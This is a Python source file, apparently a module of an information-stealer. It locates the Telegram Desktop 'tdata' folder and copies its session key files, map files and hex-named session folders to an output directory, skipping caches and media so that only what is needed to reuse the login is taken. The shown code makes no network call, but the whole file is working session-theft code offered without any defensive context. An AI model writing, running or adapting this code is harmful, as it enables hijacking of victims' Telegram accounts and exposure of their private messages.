import os
import re
import shutil
import logging


class Telegram:
    TDATA_PATH = os.path.join(os.getenv('APPDATA', ''), 'Telegram Desktop', 'tdata')
    MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
    KEY_FILES = {'key_datas', 'usertag', 'settings', 'settingss'}
    HEX_PATTERN = re.compile(r'^[A-Fa-f0-9]{16}$')
    SKIP_DIRS = {'user_data', 'emoji', 'tdummy', 'dumps', 'temp', 'working'}

    _log = logging.getLogger('Telegram')

    @classmethod
    def _should_copy_entry(cls, name: str) -> bool:
        lower = name.lower()
        if lower in cls.KEY_FILES:
            return True
        if lower.startswith('map'):
            return True
        if lower.startswith('configs'):
            return True
        if cls.HEX_PATTERN.match(name):
            return True
        if lower == 'key_datas':
            return True
        if lower.endswith('s') and cls.HEX_PATTERN.match(name[:-1]):
            return True
        return False

    @classmethod
    def run(cls, output_dir: str) -> None:
        tdata = cls.TDATA_PATH
        if not os.path.isdir(tdata):
            cls._log.info('Telegram tdata not found')
            return

        out = os.path.join(output_dir, 'Telegram', 'tdata')
        os.makedirs(out, exist_ok=True)
        copied_count = 0

        for entry in os.listdir(tdata):
            entry_path = os.path.join(tdata, entry)
            entry_lower = entry.lower()

            if entry_lower in cls.SKIP_DIRS:
                continue

            if not cls._should_copy_entry(entry):
                continue

            dst_entry = os.path.join(out, entry)

            try:
                if os.path.isfile(entry_path):
                    file_size = os.path.getsize(entry_path)
                    if file_size <= cls.MAX_FILE_SIZE:
                        shutil.copy2(entry_path, dst_entry)
                        copied_count += 1
                elif os.path.isdir(entry_path):
                    os.makedirs(dst_entry, exist_ok=True)
                    for root, dirs, files in os.walk(entry_path):
                        # skip cache subdirs
                        dirs[:] = [d for d in dirs if d.lower() not in ('cache', 'media_cache',
                                                                         'stickers', 'user_data')]
                        rel = os.path.relpath(root, entry_path)
                        dst_sub = os.path.join(dst_entry, rel)
                        os.makedirs(dst_sub, exist_ok=True)

                        for fname in files:
                            src_file = os.path.join(root, fname)
                            try:
                                fsize = os.path.getsize(src_file)
                                if fsize <= cls.MAX_FILE_SIZE:
                                    shutil.copy2(src_file, os.path.join(dst_sub, fname))
                                    copied_count += 1
                            except Exception as e:
                                cls._log.debug(f'Failed to copy {src_file}: {e}')
            except Exception as e:
                cls._log.debug(f'Failed to process {entry}: {e}')

        if copied_count > 0:
            cls._log.info(f'Copied {copied_count} Telegram files to {out}')
        else:
            cls._log.info('No Telegram session data copied')
